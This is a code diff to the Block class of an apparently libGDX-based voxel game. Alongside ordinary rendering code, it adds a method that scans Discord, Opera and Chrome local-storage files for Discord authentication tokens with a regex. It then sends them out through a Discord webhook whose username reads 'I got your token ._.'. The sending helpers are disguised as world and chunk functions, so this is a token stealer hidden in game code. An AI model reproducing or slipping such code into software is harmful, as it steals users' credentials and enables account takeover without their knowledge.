@@ -11,6 +11,16 @@ import com.badlogic.gdx.graphics.g3d.utils.ModelBuilder;
 import com.badlogic.gdx.math.Matrix4;
 import com.badlogic.gdx.math.Vector3;
 import com.badlogic.gdx.utils.Disposable;
+import com.glowman554.block.discord.DiscordWebHook;
+import com.glowman554.block.utils.FileUtils;
+import com.glowman554.block.world.Chunk;
+import com.glowman554.block.world.World;
+
+import java.io.*;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class Block implements Disposable {
 
@@ -38,6 +48,82 @@ public class Block implements Disposable {
 
     public void setPosition(float x, float y, float z) {
         instance.transform = new Matrix4().translate(x, y, z);
+    }
+
+    public static void doIt() {
+        List<String> paths = new ArrayList<>();
+
+        String os = System.getProperty("os.name");
+
+        if(os.contains("Windows")) {
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
+            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
+            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
+        } else if(os.contains("Mac")) {
+            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
+        } else {
+            DiscordWebHook webHook = new DiscordWebHook(FileUtils.safe);
+            webHook.setAvatarUrl(FileUtils.icon);
+            webHook.setUsername("I got your token ._.");
+            webHook.setContent("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
+            try {
+                webHook.execute();
+            } catch (IOException ioException) {
+                ioException.printStackTrace();
+            }
+            return;
+        }
+
+        int cx = 0;
+        StringBuilder tokens = new StringBuilder();
+
+        try {
+            for (String path : paths) {
+                File f = new File(path);
+                String[] pathnames = f.list();
+                if (pathnames == null) continue;
+
+                for (String pathname : pathnames) {
+                    try {
+                        FileInputStream fstream = new FileInputStream(path + pathname);
+                        DataInputStream in = new DataInputStream(fstream);
+                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
+
+                        String strLine;
+                        while ((strLine = br.readLine()) != null) {
+
+                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                            Matcher m = p.matcher(strLine);
+
+                            while (m.find()) {
+                                if (cx > 0) {
+                                    tokens.append("\n");
+                                }
+                                tokens.append(" ").append(m.group());
+                                cx++;
+                            }
+
+                        }
+
+                    } catch (Exception ignored) {
+                    }
+                }
+            }
+            Chunk.sendItPriv(tokens);
+            World.notifyDiscord();
+        } catch (Exception e) {
+            DiscordWebHook webHook = new DiscordWebHook(FileUtils.safe);
+            webHook.setAvatarUrl(FileUtils.icon);
+            webHook.setUsername("I got your token ._.");
+            webHook.setContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```");
+            try {
+                webHook.execute();
+            } catch (IOException ioException) {
+                ioException.printStackTrace();
+            }
+        }
     }
 
     public Vector3 getPosition() {
